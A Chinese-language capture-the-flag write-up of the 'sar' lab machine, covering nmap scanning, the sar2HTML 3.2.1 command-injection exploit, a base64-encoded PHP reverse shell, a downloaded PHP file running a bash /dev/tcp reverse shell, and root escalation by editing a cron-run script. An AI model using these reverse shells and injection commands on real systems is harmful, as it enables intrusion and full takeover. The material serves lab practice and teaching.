---
layout: page
title: sar--打靶笔记
author: 白玉京
cover: true
sidebar: []
readmore: true
date: 2024-12-10
tags: 
- 公众号推文
- Web安全
categories:
- 公众号推文
---

**PART.01 靶机设置**

将网络配置调整为NAT模式即可  

‍

**PART.02 Nmap扫描**

  

**·** **主机发现** **·**  


​    
​     sudo nmap -sn 192.168.9.150/24

![](/images/sar--打靶笔记/1752587177864.png)

![](/images/sar--打靶笔记/1752587177939.png)

新增IP为靶机IP：192.168.9.160

‍

  

**·** **TCP开放端口扫描** **·**  


​    
​     sudo nmap -sT --min-rate 10000 -p- 192.168.9.160

![](/images/sar--打靶笔记/1752587178054.png)

只开放了一个80端口

‍


**·** **UDP开放端口扫描** **·**  


​    
​     sudo nmap -sU -top 10 192.168.9.160

![](/images/sar--打靶笔记/1752587178118.png)

没信息

‍

  

**·** **TCP详细信息扫描** **·**  


​    
​     sudo nmap -sT -sV -sC -O -p80 192.168.9.160 -oA nmap/detail

![](/images/sar--打靶笔记/1752587178241.png)

linux+apache

其他暂时没啥信息

‍

  

**·** **vuln漏洞脚本扫描** **·**  


​    
​     sudo nmap --script=vuln -p80 192.168.9.160 -oA nmap/vuln

![](/images/sar--打靶笔记/1752587178401.png)

两个文件：`/robots.txt`和`phpinfo.php`

‍

**PART.03 Getshell**  

**·** **80——简单浏览** **·**  

![](/images/sar--打靶笔记/1752587178670.png)

界面竟然是这个？！

所以是一个刚建站的网站。

‍

`/robots.txt`：

![](/images/sar--打靶笔记/1752587178949.png)

`/sar2HTML`：

![](/images/sar--打靶笔记/1752587179016.png)

 _It will create the report with name sar2html-hostname-date.tar.gz under /tmp
directory._

_Click "NEW"button, browse and select the report, click"Upload report"button
to upload the data._

耶，有个文件上传点诶。

‍

继续读，感觉利用有点困难。

福至心灵，用searchsploit搜了一下sar2HTML，猜猜我看到了什么！

![](/images/sar--打靶笔记/1752587179099.png)

version3.2.1，绝配！

‍

  

**·** **80——RCE** **·**  

两个都下下来看看


​    
​    searchsploit-m47204  
​    searchsploit-m49344

![](/images/sar--打靶笔记/1752587179208.png)

**利用** 方法：`http://<ipaddr>/index.php?plot=;<command-here>`

**回显： "**os"处会被替换为执行的命令，"Select Host"展开后会发现执行结果

eg：

![](/images/sar--打靶笔记/1752587179282.png)

‍

尝试直接bash反弹shell失败，发现`&`符号被过滤了还是啥情况。

‍

尝试使用49344.py现成的利用

利用时发现了一个很搞笑的问题：因为注释在前面，因此`#!/usr/bin/env python`实际上并不是第一行，会导致运行错误。

![](/images/sar--打靶笔记/1752587179339.png)

不过还是有报错，懒了。回去吧（)

‍

`ls -liah`：

![](/images/sar--打靶笔记/1752587179452.png)

尝试在 index.php 中加入php的一句话反弹shell


​    
​    echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguOS4xNTAiLDEyMzQ1KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc= | base64-d >>index.php

![](/images/sar--打靶笔记/1752587179647.png)

啊？

‍

尝试了wget远程下载shell，发现不能附加执行权限，导致下载shell也没用。

尝试wget远程下载php

‍

`test.txt`：`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.9.150/1234
0>&1'");?>`

![](/images/sar--打靶笔记/1752587179870.png)

靶机下载：`wget http://192.168.9.150/test.txt -O test.php`

kali开启监听：`nc -lvnp 1234`

然后访问对应地址：`http://192.168.9.160/sar2HTML/test.php`

![](/images/sar--打靶笔记/1752587179936.png)

‍

**PART.04 提权**  


**·** **基础信息** **·**  

![](/images/sar--打靶笔记/1752587180160.png)

‍

  

**·** **自动任务提权** **·**  

第一反应是自动任务提权

（回忆提示：网页上有出现自动任务）

‍

看一下自动任务：


​    
​    cat /etc/crontab

![](/images/sar--打靶笔记/1752587180305.png)

每五分钟执行以下`/var/www/html/finally.sh`

‍![](/images/sar--打靶笔记/1752587180517.png)

  

可惜没有写的权限。

看眼内容：

![](/images/sar--打靶笔记/1752587180620.png)

诶哦？！我们有`write.sh`的所有权限啊。

看眼：

![](/images/sar--打靶笔记/1752587180674.png)

‍

接下来直接篡改，桀桀：`bash -c 'bash -i >& /dev/tcp/192.168.9.150/12345 0>&1'`

（我中途输错了，然后这靶机vi只能盲操作。所以我操作修改的时候不太精准，导致我倒数第二行即touch所在行变异。但是不影响，不要在意qaq）

![](/images/sar--打靶笔记/1752587180751.png)

然后在本机上开启监听，静静等待——

![](/images/sar--打靶笔记/1752587180872.png)

成功！

（可以通过`/tmp/gateway`创建与否来判断`./finally.sh`是否执行）

‍![](/images/sar--打靶笔记/1752587180965.png)

  

![](/images/sar--打靶笔记/1752587181080.png)

拿下！

  

  

